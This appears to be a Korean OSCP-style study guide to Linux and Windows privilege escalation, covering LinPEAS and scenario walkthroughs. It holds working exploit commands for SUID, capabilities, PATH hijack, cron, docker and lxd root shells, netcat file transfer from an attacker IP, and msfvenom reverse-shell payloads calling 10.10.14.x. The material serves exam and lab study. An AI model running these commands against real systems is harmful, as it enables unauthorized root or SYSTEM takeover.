LinPEAS는 **Linux Privilege Escalation Awesome Script**의 줄임말로,
🔍 **리눅스 시스템에서 권한 상승(Privilege Escalation) 가능성을 자동으로 탐색**해주는 스크립트입니다.

---

## 🧠 1. 개념 요약

| 항목    | 설명                                                        |
| ----- | --------------------------------------------------------- |
| 이름    | LinPEAS (Linux Privilege Escalation Awesome Script)       |
| 목적    | Linux 환경에서 루트 권한 상승에 사용할 수 있는 취약점, 설정 미스, 백도어 등을 자동으로 찾아줌 |
| 언어    | Bash Script                                               |
| 사용 환경 | 리눅스 타깃 시스템에 업로드 후 실행                                      |

---

## 🎯 2. 역할 & 목적

* 일반 사용자 권한으로 접속한 리눅스 시스템에서...

  * 권한이 잘못 설정된 파일, 디렉터리
  * SUID/SGID 바이너리
  * 환경 변수 설정
  * crontab 작업
  * 네트워크 정보
  * 패치되지 않은 커널 취약점
  * Docker/LXD 컨테이너 권한 우회
  * 가능한 명령어 실행 권한(`sudo`, `capabilities` 등)

➡️ 이런 **권한 상승 기회**들을 자동으로 탐지

---

## 🛠️ 3. 설치 & 실행 방법 (수동 OSCP 스타일)

### 1️⃣ 공격자 머신에서 LinPEAS 다운로드

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

### 2️⃣ 대상 시스템에 전송 (예: Netcat 사용)

```bash
# 공격자 측
nc -lvp 4444 < linpeas.sh

# 대상 시스템
nc <attacker_ip> 4444 > linpeas.sh
chmod +x linpeas.sh
```

### 3️⃣ 대상 시스템에서 실행

```bash
./linpeas.sh
```

---

## 🔍 4. 출력 예시 (탐지 항목 일부)

* SUID 바이너리 예: `/usr/bin/find` → 루트 쉘 가능 여부
* 취약한 커널 버전: CVE-xxxx-yyyy 발견
* 권한 있는 `sudo` 명령: `sudo tar` → 권한 상승 가능
* 환경변수 `PATH`에 쓰기 가능한 디렉터리
* crontab에 루트 실행 가능 명령

---

## 🧰 5. 구성요소

LinPEAS는 내부적으로 다음과 같은 것들을 체크합니다:

| 체크 항목     | 설명                           |
| --------- | ---------------------------- |
| SUID/SGID | 루트 권한으로 실행되는 명령 찾기           |
| Sudo 권한   | 특정 명령을 sudo 없이 실행 가능한지       |
| Cron Jobs | 주기적으로 실행되는 스크립트가 권한 상승 트리거인지 |
| 패치 정보     | 커널 버전 기반 취약점 여부 확인           |
| 환경 변수     | PATH, LD\_PRELOAD 등 우회 가능 여부 |
| 서비스 설정    | 시스템 서비스에 취약한 설정 여부           |

---

## ⚠️ 6. 주의사항

* 탐지 도구이므로 직접 익스플로잇하지 않음
* 실행 시 출력이 매우 많음 (grep 등으로 필터 추천)
* 자동 분석된 정보는 반드시 **직접 검토 후 사용**해야 함

---

## 🧒 어린이 버전 요약

* LinPEAS는 리눅스 컴퓨터 안에서
* "어디에 구멍(취약점)이 있을까?"를
* 자동으로 찾아주는 똑똑한 탐지 도구야!

---



---

# 🐧 \[리눅스 권한 상승 시나리오 - OSCP 스타일]

---

## 🎯 시나리오

* 타깃: Ubuntu 20.04
* 초기 쉘 권한: `www-data`
* 목적: `root`로 권한 상승

---

## 1️⃣ 정보 수집 (수동)

```bash
whoami
uname -a
hostname
id
sudo -l
```

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux | grep root
env
```

### 발견:

```bash
sudo -l
Matching Defaults entries for www-data on ubuntu:
    (ALL) NOPASSWD: /usr/bin/vim
```

→ 패스워드 없이 `vim`을 루트 권한으로 실행 가능!

---

## 2️⃣ 분석

`vim`은 쉘을 실행할 수 있음:

```vim
:!sh
```

또는 더 직접적으로:

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

---

## 3️⃣ 익스플로잇 (수동)

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
whoami
→ root
```

🔓 루트 쉘 획득 완료

---

## 🧠 핵심 개념

* **sudo -l**: sudo 명령어로 루트 권한 실행 가능한 프로그램 찾기
* **vim, less, find, python** 등은 **쉘을 호출할 수 있는 특성**이 있음
* 사용자가 직접 명령어를 실행하는 방식 → OSCP 수동 원칙 충족

---

# 🪟 \[윈도우 권한 상승 시나리오 - OSCP 스타일]

---

## 🎯 시나리오

* 타깃: Windows Server 2016
* 초기 쉘 권한: `IIS APPPOOL\DefaultAppPool`
* 목적: `NT AUTHORITY\SYSTEM`으로 권한 상승

---

## 1️⃣ 정보 수집 (수동)

```powershell
whoami
hostname
systeminfo
```

```powershell
# 권한 있는 서비스 확인
Get-Service | Where-Object { $_.StartType -eq "Auto" -and $_.Status -eq "Running" }
```

```powershell
# 권한이 낮은 사용자로 실행되는 서비스가 SYSTEM 권한으로 실행되며,
# 실행파일 경로에 공백이 있거나, 권한이 잘못 설정된 경우 확인
```

---

## 2️⃣ 분석

발견:

```
서비스명: VulnService
실행 경로: C:\Program Files\Vuln Service\vulnsvc.exe
권한: SYSTEM
```

하지만! `C:\Program Files\Vuln Service` 폴더가 모든 사용자 쓰기 가능!

→ 이 경로에 악성 `vulnsvc.exe`를 대체해 넣으면 SYSTEM으로 실행됨

---

## 3️⃣ 익스플로잇 (수동)

1. 로컬에서 리버스 쉘 payload 생성:

   ```powershell
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > vulnsvc.exe
   ```

2. 파일 업로드:

   * PowerShell, `certutil`, `nc`, `python http.server` 등으로 전송

3. 대상 서비스 실행 재시작 (서비스가 재부팅되거나 자동으로 시작될 때 실행됨)

4. 리버스 연결 대기:

   ```bash
   nc -nvlp 4444
   ```

5. SYSTEM 권한 획득

---

## 🧠 핵심 개념

* 윈도우에서는 권한 상승 경로로 "서비스 실행 파일 경로 변경"이 대표적
* 서비스 실행 파일 위치에 **쓰기 권한이 있으면** 악성 실행 파일로 교체 가능
* 공격자가 **자동 실행 환경을 악용**해서 SYSTEM 권한으로 쉘 획득

---

# ✅ 수동 권한 상승 체크리스트

| 항목        | 리눅스                                      | 윈도우                          |
| --------- | ---------------------------------------- | ---------------------------- |
| 사용자 정보    | `whoami`, `id`                           | `whoami`, `hostname`         |
| 커널/시스템 정보 | `uname -a`                               | `systeminfo`                 |
| 권한 있는 파일  | `find / -perm -u=s`, `sudo -l`, `getcap` | 서비스 실행 파일 권한, unquoted paths |
| 크론탭/서비스   | `crontab -l`, `/etc/init.d`              | `Get-Service`, `schtasks`    |
| 환경 변수     | `env`, `PATH`                            | `Get-ChildItem Env:`         |
| 취약한 소프트웨어 | 버전 확인 후 CVE 검색                           | 마찬가지                         |

---

# 🧒 어린이 요약

* 리눅스: **sudo나 특이한 파일**을 잘 보면 root가 될 수 있어!
* 윈도우: **서비스 실행 위치**가 바보처럼 열려 있으면, 내 파일로 바꿔서 SYSTEM이 실행해줘!
* **중요한 건 자동 도구 쓰지 않고**, 내가 직접 보고 실행하는 거야.

---




# 🐧 리눅스 권한 상승 시나리오별 정리

---

## 🧩 \[1] SUID 바이너리

### ✅ 개념

* SUID(SetUID): 해당 바이너리를 실행할 때, **소유자의 권한으로 실행됨**
* 루트 소유의 SUID 바이너리가 있으면 일반 사용자도 **루트 권한 명령 실행 가능**

### 🔍 탐지

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 🛠 시나리오

```bash
-rwsr-xr-x 1 root root 123456 /usr/bin/find
```

### 💣 수동 익스플로잇

```bash
/usr/bin/find . -exec /bin/sh \; -quit
whoami  # root
```

---

## 🧩 \[2] Capabilities

### ✅ 개념

* 리눅스에서 SUID 없이도 특정 권한 부여 가능 (`cap_setuid`, `cap_net_raw` 등)

### 🔍 탐지

```bash
getcap -r / 2>/dev/null
```

### 🛠 시나리오

```bash
/usr/bin/python3.8 = cap_setuid+ep
```

### 💣 수동 익스플로잇

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami  # root
```

---

## 🧩 \[3] 환경 변수 (PATH Hijacking)

### ✅ 개념

* 루트가 스크립트 내에서 `ls`, `cp` 같은 명령어를 절대 경로 없이 실행 시
* `PATH` 환경변수를 조작해서 내가 만든 가짜 바이너리 실행

### 🛠 시나리오

```bash
sudo /opt/run.sh  # 내부에서 ls 실행함
```

```bash
echo -e '#!/bin/bash\n/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo /opt/run.sh
```

### 💣 쉘 획득

```bash
whoami  # root
```

---

## 🧩 \[4] 크론탭 취약한 스크립트

### ✅ 개념

* 루트가 주기적으로 실행하는 크론탭 스크립트가 **쓰기 가능한 디렉토리/파일**에 존재하면 공격 가능

### 🔍 탐지

```bash
ls -l /etc/cron* /var/spool/cron/crontabs/
```

### 🛠 시나리오

```bash
# /etc/cron.d/backup 실행 스크립트가 /tmp/backup.sh (root가 실행함)
ls -l /tmp/backup.sh  # 일반 사용자 쓰기 가능
```

### 💣 수동 익스플로잇

```bash
echo "/bin/bash" > /tmp/backup.sh
chmod +x /tmp/backup.sh
# 기다리면 루트 쉘
```

---

## 🧩 \[5] Docker Socket (docker 그룹)

### ✅ 개념

* docker 그룹은 사실상 root 권한임
* 도커 컨테이너를 root로 실행하고, 호스트에 마운트 가능

### 🔍 탐지

```bash
id
# docker 그룹 포함 여부
```

### 💣 수동 익스플로잇

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
whoami  # root
```

---

## 🧩 \[6] LXD 컨테이너 권한 상승

### ✅ 개념

* lxd 그룹은 이미지 임포트 후 컨테이너로 루트 실행 가능

### 💣 수동 익스플로잇 시나리오 (요약)

```bash
id  # lxd 그룹 있음

# 공격자 시스템에서 alpine 이미지 만들고 tar로 압축 후 대상에 전송
lxc image import lxd.tar.gz --alias pwned
lxc init pwned pwned -c security.privileged=true
lxc config device add pwned mydev disk source=/ path=/mnt/root recursive=true
lxc start pwned
lxc exec pwned -- /bin/sh
```

---

# 🪟 윈도우 권한 상승 시나리오별 정리

---

## 🧩 \[1] Unquoted Service Path

### ✅ 개념

* 서비스 실행 경로에 `" "`(따옴표)가 없고 경로에 공백이 있으면,
  시스템은 첫 공백까지 먼저 실행 시도 (즉, 내가 만든 `C:\Program.exe` 실행 가능)

### 🔍 탐지

```powershell
wmic service get name,pathname,startmode
```

### 🛠 시나리오

```none
PathName: C:\Program Files\Vuln Service\service.exe
```

### 💣 수동 익스플로잇

```powershell
# C:\Program.exe에 리버스쉘 넣기 → 서비스 재시작
```

---

## 🧩 \[2] AlwaysInstallElevated

### ✅ 개념

* 설치된 `.msi` 파일을 SYSTEM 권한으로 실행되게 설정해 둔 정책

### 🔍 탐지

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

> 두 키 모두 값이 1이면 취약

### 💣 수동 익스플로잇

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

---

## 🧩 \[3] 권한 설정된 서비스 바이너리 교체

### ✅ 개념

* SYSTEM 서비스가 실행하는 파일의 경로에 쓰기 권한이 있으면, 공격자가 파일 교체 가능

### 🔍 탐지

```powershell
accesschk.exe -uwcqv "Users" "C:\Program Files\VulnService\"
```

### 💣 수동 익스플로잇

1. 리버스쉘 exe 생성 및 덮어쓰기
2. 서비스 재시작 → SYSTEM 쉘

---

## 🧩 \[4] 서비스 권한 오용

### ✅ 개념

* 로우 권한 사용자가 특정 서비스(시작/중지 등) 권한을 가짐

### 🔍 탐지

```powershell
accesschk.exe -uwcqv "Users" *
```

### 💣 수동 익스플로잇

* 서비스 바이너리 변경 + 서비스 시작 권한 있음 → 공격 가능

---

## 🧩 \[5] DLL Hijacking

### ✅ 개념

* 실행 파일이 특정 DLL을 불러올 때, 공격자가 만든 DLL이 먼저 로드되면 쉘 실행 가능

### 🔍 탐지

* 실행 파일 분석 도구 (`Procmon`, `DLL dependency viewer` 등)

---

# ✅ 마무리 요약표

| 구분  | 시나리오                  | 키워드                  |
| --- | --------------------- | -------------------- |
| 리눅스 | SUID                  | `find / -perm -4000` |
| 리눅스 | Capabilities          | `getcap`             |
| 리눅스 | PATH hijack           | `PATH=`              |
| 리눅스 | 크론탭                   | `crontab -l`         |
| 리눅스 | Docker/LXD            | `docker`, `lxd` 그룹   |
| 윈도우 | Unquoted Path         | `"Program Files"`    |
| 윈도우 | AlwaysInstallElevated | `reg query`          |
| 윈도우 | Service 권한 설정         | `accesschk.exe`      |
| 윈도우 | DLL Hijack            | `Procmon`            |

---

